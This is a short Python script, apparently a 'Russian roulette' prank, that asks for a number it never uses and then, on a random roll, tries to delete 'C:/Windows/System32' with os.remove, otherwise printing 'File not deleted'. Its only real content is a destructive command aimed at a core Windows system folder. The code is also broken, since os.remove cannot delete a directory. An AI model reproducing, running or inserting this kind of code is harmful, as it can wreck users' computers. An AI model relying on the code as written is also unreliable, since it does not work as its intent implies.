import random
import os

x = int(input("Enter a number: "))

if random.randint(0, 6) == 1:
    os.remove("C:/Windows/System32")
else:
    print("File not deleted")
